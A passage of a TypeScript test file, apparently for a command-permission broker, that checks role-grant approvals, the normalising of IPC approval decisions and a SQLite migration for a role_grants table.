    // A strict conversation with no role carries only the entry point that builds the target, for "do not ask in this conversation" (stage 3). It carries no role. Building happens only when the broker needs it.
    const without = await approveWith(null)
    expect(without?.role).toBeUndefined()
    expect(without?.grantSubject).toBeUndefined()
    expect(without?.grantSubjectOf?.()).toEqual({ kind: 'command', command: 'docker build .' })
    // A non-strict conversation with no role carries neither target nor entry point (it looks up neither the table nor the conversation's permissions).
    const relaxed = await approveWith(null, false)
    expect(relaxed?.role).toBeUndefined()
    expect(relaxed?.grantSubject).toBeUndefined()
    expect(relaxed?.grantSubjectOf).toBeUndefined()
  })
})

describe('IPC の受け口 (asDecision)', () => {
  it('allow-role は期限だけを受け、知らない期限は 1 回の許可に落とす', () => {
    expect(asDecision({ kind: 'allow-role', scope: 'today' })).toEqual({ kind: 'allow-role', scope: 'today' })
    expect(asDecision({ kind: 'allow-role', scope: 'forever', subject: 'rm' })).toEqual({ kind: 'allow-role', scope: 'forever' })
    expect(asDecision({ kind: 'allow-role', scope: 'year' })).toEqual({ kind: 'allow' })
    expect(asDecision({ kind: 'allow-role' })).toEqual({ kind: 'allow' })
  })
})

describe('migration 43 と RoleGrantStore', () => {
  const opened: Database.Database[] = []
  afterEach(() => {
    for (const db of opened.splice(0)) db.close()
  })

  it('role_grants を作り、41 から当て直せる。行は往復する', () => {
    const db = new Database(':memory:')
    opened.push(db)
    runMigrations(db)
    expect(db.pragma('user_version', { simple: true })).toBeGreaterThanOrEqual(43)
    db.pragma('user_version = 41')
    expect(() => runMigrations(db)).not.toThrow()
    const store = new RoleGrantStore(db)
    const added = grantRowOf(
      { subjectKind: 'path-prefix', subject: '/w/a/proj', subjectHash: null, access: 'write' },
      'job:A',
      'Write',
      'today',
      't1',
      NOW
    )
    store.addRoleGrants([added])
    expect(store.loadRoleGrants()).toEqual([added])
    const index = db.prepare("SELECT name FROM sqlite_master WHERE type = 'index' AND name = 'role_grants_role'").get()
    expect(index).toBeDefined()
  })
})
